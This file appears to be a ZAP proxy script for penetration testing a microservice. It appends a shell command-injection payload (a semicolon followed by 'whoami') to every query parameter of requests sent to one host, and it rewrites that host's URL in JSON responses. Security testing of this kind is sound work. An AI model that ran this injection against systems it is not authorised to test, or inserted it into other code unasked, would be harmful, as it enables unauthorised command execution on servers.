
function sendingRequest(msg, initiator, helper) {
    var TARGET_PATH = "http://temp-monitor-microservice-java:80";
    var INJECTION = "%3B+whoami";

    var uriObj = msg.getRequestHeader().getURI();
    if (uriObj === null) {
        print("URI is null");
        return;
    }

    var uriStr = uriObj.toString();
    print("Script started for request to: " + uriStr);

    if (!uriStr.startsWith(TARGET_PATH)) {
        print("Target path "  + TARGET_PATH + "DID NOT match URI : " +uriStr);
        return;
    }

    print("Target path matched: " + TARGET_PATH);

    var escapedQuery = uriObj.getEscapedQuery();
    if (escapedQuery === null || escapedQuery.length === 0) {
        print("No query string to modify");
        return;
    }

    print("Original query: " + escapedQuery);

    var parts = escapedQuery.split("&");
    var newParts = [];

    for (var i = 0; i < parts.length; i++) {
        var kv = parts[i].split("=");
        var key = kv[0];
        var val = kv.length > 1 ? kv[1] : "";

        var modifiedVal = val + INJECTION;
        print(" - Modifying parameter '" + key + "' from '" + val + "' to '" + modifiedVal + "'");

        newParts.push(key + "=" + modifiedVal);
    }

    var newQuery = newParts.join("&");
    uriObj.setEscapedQuery(newQuery);
    msg.getRequestHeader().setURI(uriObj);

    print("New query after modification: " + newQuery);
}

function responseReceived(msg, initiator, helper) {
    print("Intercepted Response: " + msg.getResponseHeader().getStatusCode());

    if (msg.getResponseHeader().getHeader("Content-Type") &&
        msg.getResponseHeader().getHeader("Content-Type").contains("application/json")) {
        var body = msg.getResponseBody().toString();
        print("Initial body: " + body);
        body = body.replace("http://temp-monitor-microservice-java:80", "http://fakeUrl.pentest");
         print("Modified body: " + body);
        msg.setResponseBody(body);

        msg.getResponseHeader().setContentLength(body.length);
    }
}